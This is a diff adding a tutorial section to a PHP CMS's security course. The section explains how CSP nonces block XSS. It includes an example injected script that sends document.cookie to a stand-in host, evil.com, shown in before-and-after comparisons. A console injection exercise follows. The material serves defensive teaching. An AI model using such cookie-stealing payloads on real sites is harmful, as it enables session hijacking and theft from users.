@@ -45,9 +45,122 @@ include "contents/" . $page . ".php";</code></pre>
     </section>
 
     <section class="step">
-        <h2>🧪 Step 3: Neutralizing XSS with CSP</h2>
-        <p>Even if an attacker injects a malicious script, a strong <strong>Content Security Policy</strong> can block its execution.</p>
-        <p><strong>Task:</strong> Open <code>themes/CmsForNerd/bodytop.tpl</code> and locate the CSP meta tag. Update it to <strong>MUST NOT</strong> allow scripts from untrusted domains.</p>
+        <h2>🛡️ Step 3: CSP Nonces - Google-Grade XSS Protection</h2>
+        <p>Even if an attacker injects a malicious script, a strong <strong>Content Security Policy with nonces</strong> can block its execution.</p>
+        
+        <div class="concept-box">
+            <h3>What is a Nonce?</h3>
+            <p>A <strong>nonce</strong> (number used once) is a cryptographically random string generated for each page load. 
+            Only scripts with this exact nonce are allowed to execute.</p>
+        </div>
+
+        <h3>📋 Task 3.1: Understand the Implementation</h3>
+        <p>Study how CMSForNerd implements CSP nonces across three critical files:</p>
+        
+        <div class="file-study">
+            <h4>File 1: includes/SecurityUtils.php</h4>
+            <p>Open this file and find the <code>generateNonce()</code> method:</p>
+            <div class="code-block modern">
+                <pre><code>public static function generateNonce(): string
+{
+    // Generate a 128-bit (16-byte) random nonce
+    return base64_encode(random_bytes(16));
+}</code></pre>
+            </div>
+            <p><strong>Question:</strong> Why do we use <code>random_bytes(16)</code> instead of <code>rand()</code>?</p>
+            <p class="answer-hint">💡 Click to reveal: <code>random_bytes()</code> is cryptographically secure (unpredictable), while <code>rand()</code> is predictable and can be cracked.</p>
+        </div>
+
+        <div class="file-study">
+            <h4>File 2: includes/CmsContext.php</h4>
+            <p>Find where the nonce is stored:</p>
+            <div class="code-block modern">
+                <pre><code>public string $cspNonce;
+
+public function __construct(
+    // ... parameters
+    ?string $cspNonce = null,
+) {
+    $this->cspNonce = $cspNonce ?? SecurityUtils::generateNonce();
+}</code></pre>
+            </div>
+            <p><strong>Task:</strong> Add a <code>var_dump($ctx->cspNonce);</code> in <code>index.php</code> to see the nonce. Reload the page multiple times - does it change?</p>
+        </div>
+
+        <div class="file-study">
+            <h4>File 3: contents/common-headertag.inc</h4>
+            <p>Locate the CSP header and script tags:</p>
+            <div class="code-block modern">
+                <pre><code>&lt;meta http-equiv="Content-Security-Policy" 
+      content="script-src 'self' 'nonce-&lt;?= $ctx-&gt;cspNonce ?&gt;' ..."&gt;
+
+&lt;script type="application/ld+json" nonce="&lt;?= $ctx-&gt;cspNonce ?&gt;"&gt;
+    {/* JSON-LD data */}
+&lt;/script&gt;</code></pre>
+            </div>
+        </div>
+
+        <h3>🧪 Task 3.2: The XSS Attack Simulation</h3>
+        <p><strong>Scenario:</strong> An attacker injects malicious JavaScript into your page.</p>
+        
+        <div class="comparison-grid">
+            <div class="vulnerable-code">
+                <h4>❌ Without CSP Nonce (Vulnerable)</h4>
+                <div class="code-block legacy">
+                    <pre><code>&lt;!-- Legitimate script --&gt;
+&lt;script&gt;
+    console.log("Normal operation");
+&lt;/script&gt;
+
+&lt;!-- ATTACKER INJECTED THIS! --&gt;
+&lt;script&gt;
+    document.location='http://evil.com?cookie='+document.cookie;
+&lt;/script&gt;</code></pre>
+                </div>
+                <p class="danger">🚨 Both scripts execute! User cookies stolen!</p>
+            </div>
+
+            <div class="secure-code">
+                <h4>✅ With CSP Nonce (Secure)</h4>
+                <div class="code-block modern">
+                    <pre><code>&lt;!-- Legitimate script with nonce --&gt;
+&lt;script nonce="dGhpc2lzYXJhbmRvbQ=="&gt;
+    console.log("Normal operation");
+&lt;/script&gt;
+
+&lt;!-- ATTACKER INJECTED THIS! --&gt;
+&lt;script&gt;
+    document.location='http://evil.com?cookie='+document.cookie;
+&lt;/script&gt;</code></pre>
+                </div>
+                <p class="success">✅ Only first script runs! Injected script blocked by CSP!</p>
+            </div>
+        </div>
+
+        <h3>🔬 Live Challenge: Attack Your Own Site!</h3>
+        <ol>
+            <li>Open your browser's DevTools (<kbd>F12</kbd>)</li>
+            <li>Go to the <strong>Console</strong> tab</li>
+            <li>Try to inject a script:
+                <div class="code-block">
+                    <pre><code>var script = document.createElement('script');
+script.textContent = 'alert("I hacked you!");';
+document.body.appendChild(script);</code></pre>
+                </div>
+            </li>
+            <li><strong>Expected Result:</strong> You should see an error:
+                <div class="console-output">
+                    <pre>❌ Refused to execute inline script because it violates the following 
+   Content Security Policy directive: "script-src 'self' 'nonce-XXXXX'".</pre>
+                </div>
+            </li>
+        </ol>
+
+        <p><strong>Full Guide:</strong> For a comprehensive tutorial with best practices, see the 
+        <a href="csp-nonce-guide.php" class="guide-link">🛡️ CSP Nonce Implementation Guide</a></p>
+    </section>
+
+    <section class="step">
         <div class="code-block html">
             <pre><code>&lt;meta http-equiv="Content-Security-Policy" content="
     default-src 'self'; 
